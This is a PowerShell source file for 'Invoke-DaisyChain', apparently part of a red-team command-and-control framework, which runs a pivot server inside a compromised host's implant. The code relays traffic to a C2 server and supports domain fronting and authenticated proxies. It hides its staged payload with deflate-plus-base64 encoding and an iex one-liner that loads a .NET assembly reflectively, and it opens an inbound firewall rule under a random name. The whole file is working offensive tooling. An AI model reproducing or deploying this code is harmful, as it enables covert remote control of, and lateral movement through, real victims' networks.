<#
.Synopsis
    Invoke-DaisyChain

    Ben Turner @benpturner

.DESCRIPTION
	PS C:\> Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2server http://c2.goog.com:443 -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)
.EXAMPLE
    PS C:\> Invoke-DaisyChain -daisyserver http://192.168.1.1 -port 80 -c2server http://c2.goog.com:443 -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080
.EXAMPLE
    PS C:\> Invoke-DaisyChain -daisyserver http://10.150.10.20 -port 8888 -c2server http://10.150.10.10:8888 -URLs '"pwned/test/123","12345/drive/home.php"'
#>
$Global:firewallName = ""
$Global:serverPort = ""
function Invoke-DaisyChain {

param(
[Parameter(Mandatory=$true)][string]$port, 
[Parameter(Mandatory=$true)][string]$daisyserver,
[Parameter(Mandatory=$true)][string]$c2server, 
[Parameter(Mandatory=$true)][string]$URLs,
[Parameter(Mandatory=$false)][switch]$Localhost,
[Parameter(Mandatory=$false)][switch]$NoFWRule,
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$domfront, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyurl, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyuser, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxypassword
)


if ($psversiontable.CLRVersion.Major -lt 4)
{
    write-output "[-] DaisyServer will only work with CLRVersion 4 and above"
} else {


if ($firewallName) {
    echo "[-] DaisyServer already ran in this implant cannot run twice due to prefixes being defined"

} else {
    
$fw = Get-FirewallName -Length 15
$script:firewallName = $fw
$firewallName = $fw 
$script:serverPort = $port
$serverPort = $port

if ($Localhost.IsPresent){
echo "[+] Using localhost parameter"
$HTTPServer = "localhost"
$daisyserver = "http://localhost"
$NoFWRule = $true
} else {
$HTTPServer = "+"
}

$script:serverPort = $port

$fdsf = @"
`$URLS = $($URLS)
`$Asm = "
`$DllBytes  = [System.Convert]::FromBase64String(`$Asm)
`$Assembly = [System.Reflection.Assembly]::Load(`$DllBytes)
`$DaisyServer = New-Object DaisyServer
[DaisyServer]::server = "${c2server}"
[DaisyServer]::httpserverport = "$port"
[DaisyServer]::httpserver = "$HTTPServer"
[DaisyServer]::useragent = "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
[DaisyServer]::URLs = @($($URLS))
[DaisyServer]::proxyurl = "$proxyurl"
[DaisyServer]::proxyuser = "$proxyuser"
[DaisyServer]::proxypassword = "$proxypassword"
[DaisyServer]::domainfrontheader = "$domfront"
[DaisyServer]::referer = `$null
[DaisyServer]::StartDaisy()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

if ($domfront -and (($psversiontable.CLRVersion.Major -lt 3))) {
    echo "[-] When using domain fronting and daisy chaining the .NET version needs to be v4 or above"
} 


$t = Invoke-Netstat| ? {$_.ListeningPort -eq $port}
$global:kill = [HashTable]::Synchronized(@{})
$kill.log = "1"

if ($NoFWRule.IsPresent) {
    echo "No firewall rule added"
}else {
    echo "Adding firewall rule name: $firewallName for TCP port $port"
    echo "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
    Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes
}

if (!$t) { 
    if (Test-Administrator) { 
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null
        echo ""
        echo "[+] Running DaisyServer as Administrator:"
    } else {
        if(!$Localhost.IsPresent)
        {
            echo "[+] Running DaisyServer as Standard User, must use -localhost flag for this to work. Aborting."
            echo ""
            return
        }
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null 
        echo "[+] Running DaisyServer as Standard User on localhost"
        echo ""
        
    }  

    echo "[+] To stop the Daisy Server, run StopDaisy in the current process"
}
    
}


}


}
function Stop-Daisy {    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.DownloadString("http://localhost:$serverPort/plugins/77/v1.0/stats.php")|Out-Null            
    } catch {}
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()
        $webClient.DownloadString("http://localhost:$serverPort/plugins/77/v1.0/stats.php")|Out-Null            
    } catch {}
    $error.clear()

    if(Test-Administrator){
        Netsh.exe advfirewall firewall del rule name="$firewallName"
    }
    
}

function StopDaisy {    
    Stop-Daisy
}

function Get-FirewallName 
{
param (
    [int]$Length
)
$set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
$result = ''
for ($x = 0; $x -lt $Length; $x++) 
{
    $result += $set | Get-Random
}
return $result
}
Function Invoke-Netstat {                       
try {            
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $TCPProperties.GetActiveTcpListeners()            
    foreach($Connection in $Connections) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
        $OutputObj = New-Object -TypeName PSobject            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
        $OutputObj            
    }            
            
} catch {            
    Write-Error "Failed to get listening connections. $_"            
}
}
function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

